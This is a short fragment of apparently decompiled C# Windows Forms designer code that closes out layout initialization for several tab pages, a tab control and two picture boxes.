		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((Control)tabPage2).ResumeLayout(false);
		((Control)tabPage2).PerformLayout();
		((Control)tabControl2).ResumeLayout(false);
		((Control)tabPage3).ResumeLayout(false);
		((Control)tabPage3).PerformLayout();
		((Control)tabPage4).ResumeLayout(false);
		((Control)tabPage4).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)LockerPicBox).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
